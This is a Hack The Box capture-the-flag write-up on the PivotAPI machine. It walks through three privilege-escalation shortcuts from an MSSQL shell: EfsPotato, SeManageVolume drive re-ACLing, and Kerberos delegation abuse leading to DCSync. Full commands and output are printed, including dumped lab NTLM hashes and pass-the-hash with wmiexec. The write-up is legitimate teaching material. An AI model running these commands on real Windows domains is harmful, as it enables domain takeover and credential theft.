---
title: HTB: Three More PivotAPI Unintendeds
url: https://0xdf.gitlab.io/2021/11/08/htb-pivotapi-more.html
date: 2021-11-08T09:30:00+00:00
tags: ctf, hackthebox, htb-pivotapi, windows, mssql-shell, seimpersonate, efspotato, sebackupvolume, ntfscontrolfile, dcsync, secretsdump, rubeus, sharp-collection, kerberos, ticketconverter, ntpdate, crackmapexec, wmiexec
---

![PivotAPI](https://0xdfimages.gitlab.io/img/pivotapi-more-cover.png)

There were three other techniques that were used as shortcuts on PivotAPI that I thought were worth sharing but that I didn’t have time to get into my original post. xct tipped me off to exploiting Sempersonate using EfsPotato (even after the print spooler was disabled), as well as abusing SeManageVolume to get full read/write as admin. TheCyberGeek and IppSec both showed how to abuse delegation to do a DCSync attack.

## Background

### Credits

These solutions come from some really good products that are worth checking out:
- xct tipped me to the first two solutions, and he shows both in [his PivotAPI video](https://youtu.be/hzsGMj9C8Nw?t=1896).
- IppSec showed abusing delegation to do a DCSync attack in his [PivotAPI video](https://youtu.be/FbTxPz_GA4o?t=7226).
- TheCyberGeek shows the delegation abuse as well in the [official writeup](https://www.hackthebox.com/home/machines/profile/345) (available to VIP subscribers).

### Starting Access

#### Commands

All three of these start from the MSSQL shell initial foothold. I’ve got creds for the sa account on the MSSQL instance, and I’m using the [alamot shell](https://alamot.github.io/mssql_shell/) for easy command execution. See the previous post up to [here](/2021/11/06/htb-pivotapi.html#mssql-shell) for details on that.

I could also just use [Impacket](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)’s `mssqlclient.py` and then run commands using `xp_cmdshell`:

```

SQL> exec xp_cmdshell whoami
output
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   

nt service\mssql$sqlexpress

NULL

```

#### Privs

This shell is running as the local nt service\mssql$sqlexpress account, and it has a handful of privileges:

```

CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\Windows\system32> whoami 
nt service\mssql$sqlexpress

CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\Windows\system32> whoami /priv

INFORMACIÓN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripción                                       Estado       
============================= ================================================= =============
SeAssignPrimaryTokenPrivilege Reemplazar un símbolo (token) de nivel de proceso Deshabilitado
SeIncreaseQuotaPrivilege      Ajustar las cuotas de la memoria para un proceso  Deshabilitado
SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio          Deshabilitado
SeChangeNotifyPrivilege       Omitir comprobación de recorrido                  Habilitada   
SeManageVolumePrivilege       Realizar tareas de mantenimiento del volumen      Habilitada   
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticación      Habilitada   
SeCreateGlobalPrivilege       Crear objetos globales                            Habilitada   
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso      Deshabilitad

```

In this post, I’ll show how to abuse this access three different ways using `SeImpersonatePrivilege`, `SeManageVolumePrivilege`, and abusing delegation to DCSync.

### Uploading Files

For each of these methods I’ll need to upload a binary to PivotAPI. The MSSQL shell I’m using has an `UPLOAD` command. To get it to work I had to replace `base64.encodestring` with `base64.encodebytes`, as the `encodestring` function is deprecated and since Python3.1 and not in `base64` since Python 3.9.

I can also follow the intended path one step further and get the creds for 3v4Si0N, which work for SSH and SCP.

## SeImpersonate

### Background

The typical go-to to exploit SeImpersonate is [RoguePotato](https://github.com/antonioCoco/RoguePotato). However, this exploit requires that the box can connect to a machine I control on TCP 135. In this case, PivotAPI is blocking that outbound traffic.

[PrintSpoofer](https://github.com/itm4n/PrintSpoofer) is another option I showed in my [original blog post](/2021/11/06/htb-pivotapi.html#shortcut-2), but the print spooler was disabled on PivotAPI shortly after release.

The entire focus of all of these attacks is to get some service to get the NT AUTHORITY\SYSTEM account to connect and authenticate to the exploit process, which exposes a SYSTEM token, which is then used with the impersonation privileges to be SYSTEM.

[EfsPotato](https://github.com/zcgonvh/EfsPotato) is another variation on this theme. It’s using the MS-EFS RCP API to solicit authentication from the machine account.

### EfsPotato

#### Compile

I’ll download the single file, `EfsPotato.cs` from [GitHub](https://github.com/zcgonvh/EfsPotato/blob/master/EfsPotato.cs) to my Windows VM. There are compile instructions on the readme, and they are very simple. I had success using the v4 .NET compiler:

```

PS > C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe efspotato.cs
Microsoft (R) Visual C# Compiler version 4.8.4084.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240

efspotato.cs(103,29): warning CS0618: 'System.IO.FileStream.FileStream(System.IntPtr, System.IO.FileAccess, bool)' is
        obsolete: 'This constructor has been deprecated.  Please use new FileStream(SafeFileHandle handle, FileAccess
        access) instead, and optionally make a new SafeFileHandle with ownsHandle=false if needed.
        http://go.microsoft.com/fwlink/?linkid=14202'

```

The warning is something that can be ignored.

It makes an EXE:

```

PS > ls .\efspotato.*

    Directory: C:\Users\0xdf\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         11/7/2021   6:21 AM          24899 efspotato.cs
-a----         11/7/2021   6:31 AM          16384 efspotato.exe

```

I’ll move that back to my Linux VM, and then upload it to `C:\programdata` on PivotAPI.

#### Execution

Running this is quite simple - it just needs the command that I want to run as SYSTEM. For example:

```

CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\ProgramData> .\efs.exe whoami
Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privilege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.

[+] Current user: NT Service\MSSQL$SQLEXPRESS
[!]binding ok (handle=1045990)
[+] Get Token: 748
[!] process with pid: 3980 created.
==============================
nt authority\system

```

From here I could read `root.txt`, or put a hole in the firewall so I could get a reverse shell.

## SeBackupVolume

### Background

According to [Microsoft](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks), the `SeManageVolumePrivilege` is used for:

> This policy setting determines which users can perform volume or disk management tasks, such as defragmenting an existing volume, creating or removing volumes, and running the Disk Cleanup tool.
>
> Use caution when assigning this user right. Users with this user right can explore disks and extend files in to memory that contains other data. When the extended files are opened, the user might be able to read and modify the acquired data.

Basically this privilege gives accesses to the disks.

On Googling “SeManageVolume”, the first result was [this tweet](https://twitter.com/0gtweet/status/1303427935647531018):

> SeManageVolumePrivilege to "Full Admin" escalation:  
> 1. Enable the privilege in the token  
> 2. Create handle to \\.\C: with SYNCHRONIZE | FILE\_TRAVERSE  
> 3. Send the FSCTL\_SD\_GLOBAL\_CHANGE to replace S-1-5-32-544 with S-1-5-32-545  
> 4. Overwrite utilman.exe etc.  
> 5. 😎 [pic.twitter.com/qIgxqvsHqO](https://t.co/qIgxqvsHqO)
>
> — Grzegorz Tworek (@0gtweet) [September 8, 2020](https://twitter.com/0gtweet/status/1303427935647531018?ref_src=twsrc%5Etfw)

The idea here is pretty simple. With the privilege I’m able to get a handle to the main drive, and pass that to `NtFsControlFile` to re-ACL the entire drive from S-1-5-32-544 (administrators group) to S-1-5-32-545 (users group)([MS docs](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers)). The code looks like [this tweet](https://twitter.com/0gtweet/status/1303302001070088194):

> Did you re-ACL a drive in the past? And what if I tell you it is possible with literally ONE NtFsControlFile(FSCTL\_SD\_GLOBAL\_CHANGE…) call? Operates directly on streams in $Security and is not-so-poorly documented in winioclt.h.   
> Open source, as usual: <https://t.co/KiUmqVLJvL> [pic.twitter.com/kr4TIZsP0w](https://t.co/kr4TIZsP0w)
>
> — Grzegorz Tworek (@0gtweet) [September 8, 2020](https://twitter.com/0gtweet/status/1303302001070088194?ref_src=twsrc%5Etfw)

This effectively gives all users access to all files by default.

### Exploit

#### Compile

The hardest part here is compiling the Windows binary so that it’ll work. I made some silly mistakes that cost me a lot of time. I’ll download [xct’s repo](https://github.com/xct/SeManageVolumeAbuse/blob/main/SeManageVolumeAbuse/SeManageVolumeAbuse.cpp) and open it in Visual Studio in my Windows VM. I’ll make sure to set the build to Release x64, and then build the project. (When I was building as Debug, it was [not bringing all the needed DLLs](https://stackoverflow.com/questions/51437963/msvcp140d-dll-missing-is-there-a-way-around) so it would just run and not show any errors in my shell.)

#### Run

I’ll upload the binary to `C:\programdata\v.exe`. Before running it, I cannot (as expected) read `root.txt`:

```

CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\ProgramData> type C:\users\cybervaca\desktop\root.txt
Acceso denegado.

```

After running it, the permissions across the entire drive are changed, and I can access it:

```

CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\ProgramData> .\v
Success! Permissions changed.
CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\ProgramData> type C:\users\cybervaca\desktop\root.txt
b32c5e3e************************

```

## DCSync

### Background

When Windows service accounts authenticate over the network, they do so as the machine account on a domain-joined system. [This post](https://exploit.ph/delegate-2-thyself.html) does a really good job with the details of what’s being abused here.

Because I’m running as the service account for MSSQL, if I can authenticate back to the DC over the network as that account, it will be the machine account for the machine MSSQL is running on, which happens to be the DC. And the machine account for the DC has access to do a DC Sync attack, which is basically telling the DC you’d like copies of all of it’s data.

### DC Sync

#### Tools

I’ll use the [Rubeus](https://github.com/GhostPack/Rubeus) tool to carry out the attack. The Rubeus repo doesn’t keep compiled binaries, but the [SharpCollection](https://github.com/Flangvik/SharpCollection) repo is a bunch of pre-compiled Windows attack tools.

I’ll grab the `Rubeus.exe` from `NewFramework_4.0_Any` and upload it to PivotAPI.

#### Get Ticket

Now I’ll use `Rubeus.exe` to first get a fake delegation ticket for the machine account:

```

CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\ProgramData> .\Rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0 

[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/PivotAPI.LicorDeBellota.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: 6g2Dq2qtY+Nv3ER+m552rbUHenFM3DxlEdB/yjj3ssg=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFeDCCBXSgAwIBBaEDAgEWooIEajCCBGZhggRiMIIEXqADAgEFoRQbEkxJQ09SREVCRUxMT1RBLkhUQqInMCWgAwIBAqEeMBwbBmtyYnRndBsSTElDT1JERUJFTExPVEEuSFRCo4IEFjCCBBKgAwIBEqEDAgECooIEBASCBABJUJ+3dI0WAc0Nc/skPSgNY06KqGmwSNChX7FUMhYv+0MfoPwC4fKCbSO0nnDq1/RDQaUNRcqWl1D1l
dEObdHU6YyV0ebo6pZ8i4suKjXTX5M/gVz4ONSE4x05HHLSKI1wbmX7lWemSd5vzBmd9pgvp8D8CzN270ncW/c+gbcdv9OJ3EFNChci54AoUm1GbTlV4VJk8bLeTaSG9TmtQc/7pzXxcjBXbQ2hyfh4RaYFfg2LVmPv2x2Dr1/WhhcEaL/TrnIaWnhxZs6kIfmiHqh9c3ZGEgeuW3I9fwd+mUMCJqKOXSCdtgBUh70E+xHasNCqv/WCIfbb/II9
SHdDCI8Gj7eeRyeL+JY/YOXnHEtDtBcOHOmRHl+pTSRp3gDJyvpv5a7jdZD/4NDnlXtLOTPogKl90NRqpl5TyZShaCT8zso1yOGShy9e62LPTIpGGdEn+0QkilTu6SnKMvFP8peypzXCSHdbigKxrXnCpOlih0cS3RFvOS0l/NWiu2rz1Jf9OK4eStuDaE2MhP+58kozQRyAhKCAVQw02V9g+r9jR+3xe96mKHG00ZPwLRgpRVfcHypgfWy9Hqr
MtvO8tZpsbpd/+r32bGgce2aVtZp0rgq3NK1aD/ORE4V6AmynfgsQ+S4d53Dc76511AVtS1t11E6I1ilJVcMH+KnxGxOHi578pKSWHNPoUE5aQ58alCYIbljJcM/En16v+r+xM/rr8n9o483ma8b5KBuye5LZ1UB8IwlXSQSZbnB5y0cunIYgdfeBfBBB82ZWQcOx+kDyJIC/LkjBLxdpvPY8iqgk5GSn1KAQAu4lsFbgoRgT0BwhaueURGWNGy
gRyNe7tPxUp3WJCTrItYEG+JHcERBorY17wvPZ24QcCEjf26k1PiedA0LplVSVzjW+c8dka3JZfsB0hC5HAJzairIt5yFIUy+iuFSNC3aRYUfxXrtGJYNmfwjHsWiUX3sFBUTnSmwZIqB9dgE175fto4C9EEjdOGtQBKHde9Y8foxEJaosVg6XTHNPpft5hmly0uQlEuVFIBOEbMaZ/NfJ7frBF/rMrdR8w2ZLp2+F6A/Akww+5TukENgPCszCL
P7Y70VP4FXVK34r0JnEg4E8OoMs45iFN3eT9PU/kwNRCthxPx9xKvJd6cT9tzS8x9DbODLTbwhWrVIgTYXk6Fdlh/ogJXOd/DyF6ied0JEmy1znWnLwV2Vf+/ERnKEe0OJup3Pvsy8eNygMLBSMZ50K52Mr0oxplFP4rYXuR1hEoqgXJM++C+R7w4SUcNdtq7VcTpZkphV55YG6YugAaCOvrkwh66vgu0gQ39wrl23aWmli93cGdYC7+v4LzlXm
qu5j15djwxPFo4H5MIH2oAMCAQCige4Eget9gegwgeWggeIwgd8wgdygKzApoAMCARKhIgQgaAtQsYwuKV21JRM2y619pvqa/Kam3r7S+Pi4vd6wVHChFBsSTElDT1JERUJFTExPVEEuSFRCohYwFKADAgEBoQ0wCxsJUElWT1RBUEkkowcDBQBgoQAApREYDzIwMjExMTA3MjExODE5WqYRGA8yMDIxMTEwODA3MTgxOVqnERgPMjAyMTExMTQ
yMTE4MTlaqBQbEkxJQ09SREVCRUxMT1RBLkhUQqknMCWgAwIBAqEeMBwbBmtyYnRndBsSTElDT1JERUJFTExPVEEuSFRC

```

I’ll save that base64-encoded ticket to a file, and decode it into a new file:

```

oxdf@parrot$ base64 -d machine.kirbi.b64 > machine.kirbi

```

Now I’ll convert it to ccache format with [another Impacket tool](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py), `ticketConverter.py`:

```

oxdf@parrot$ ticketConverter.py machine.kirbi machine.ccache
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] converting kirbi to ccache...
[+] done

```

I’ll set that file to be the `KRB5CCNAME` environment variable so that it is used to authentication on upcoming commands:

```

oxdf@parrot$ export KRB5CCNAME=/home/oxdf/hackthebox/pivotapi-10.10.10.240/machine.ccache

```

#### Time Skew

It’s possible to run into issues if the clock on my system and the DC are off by more than a few minutes. That will happen here. If I try to run `secretsdump.py` now, it will fail:

```

oxdf@parrot$ secretsdump.py LICORDEBELLOTA.HTB/pivotapi\$@pivotapi.licordebellota.htb -dc-ip 10.10.10.240 -no-pass -k         
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user          
[*] Cleaning up...       

```

Trying to use this ticket with `crackmapexec` will show a more descriptive error:

```

oxdf@parrot$ crackmapexec smb pivotapi.licordebellota.htb -k
SMB         10.10.10.240    445    PIVOTAPI         [*] Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.240    445    PIVOTAPI         [-] LicorDeBellota.htb Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) 

```

`ntpdate -u [ip]` will update my local system time to that of the server at the given IP. Some tricks that I found useful:
- Changing the time this way seemed to kill my VPN connection. I lost some frustrating time not realizing I wasn’t connected any more. A quick reconnection after changing the time fixed that.
- VirtualBox is constantly trying to sync it’s guest VMs with the host time. I had to turn off the service on my host to get it to stop that. On my Ubuntu host, that was `sudo service virtualbox-guest-utils stop`.

Once I run that, it updates my clock:

```

oxdf@parrot$ sudo ntpdate -u 10.10.10.240
 7 Nov 16:31:39 ntpdate[484337]: step time server 10.10.10.240 offset +557.901133 sec

```

Now I can `crackmapexec`:

```

oxdf@parrot$ crackmapexec smb pivotapi.licordebellota.htb -k
SMB         pivotapi.licordebellota.htb 445    PIVOTAPI         [*] Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)
SMB         pivotapi.licordebellota.htb 445    PIVOTAPI         [+] LicorDeBellota.htb\PIVOTAPI$ 

```

#### Hashes

With the time offset fixed, I can DC Sync:

```

oxdf@parrot$ secretsdump.py LICORDEBELLOTA.HTB/pivotapi\$@pivotapi.licordebellota.htb -dc-ip 10.10.10.240 -no-pass -k                                                          
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets                            
Administrador:500:aad3b435b51404eeaad3b435b51404ee:efbb8ce4a3ea4cdd0377e13a6fe9e37e:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3fc8c66f79c15020a2c2c7f1cffd8049:::
cybervaca:1000:aad3b435b51404eeaad3b435b51404ee:c33f387f6f7ab01aa1a8a29039d9feef:::
LicorDeBellota.htb\3v4Si0N:1107:aad3b435b51404eeaad3b435b51404ee:bcc9e3e5704ae1c7a91cbef273ff23e5:::
LicorDeBellota.htb\Kaorz:1109:aad3b435b51404eeaad3b435b51404ee:9c26ac73552428b4b624e7fbcc720b85:::
LicorDeBellota.htb\jari:1116:aad3b435b51404eeaad3b435b51404ee:139fcd90ef171f43ef5b48025f773848:::
LicorDeBellota.htb\superfume:1117:aad3b435b51404eeaad3b435b51404ee:cff95776a76ea23a8106d6653daa4cbc:::
LicorDeBellota.htb\Dr.Zaiuss:1118:aad3b435b51404eeaad3b435b51404ee:cff95776a76ea23a8106d6653daa4cbc:::
...[snip]...

```

### Shell

Those hashes will work for a Pass-The-Hash to get a shell as any of the accounts, like administrator or the other administrator, cybervaca. Since cybervaca has the root flag, I’ll get a shell as that user using `wmiexec`:

```

oxdf@parrot$ wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c33f387f6f7ab01aa1a8a29039d9feef cybervaca@10.10.10.240
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
licordebellota\cybervaca
C:\>cd \users\cybervaca\desktop
C:\users\cybervaca\desktop>type root.txt
b32c5e3e************************

```

[« PivotAPI Walkthrough](/2021/11/06/htb-pivotapi.html)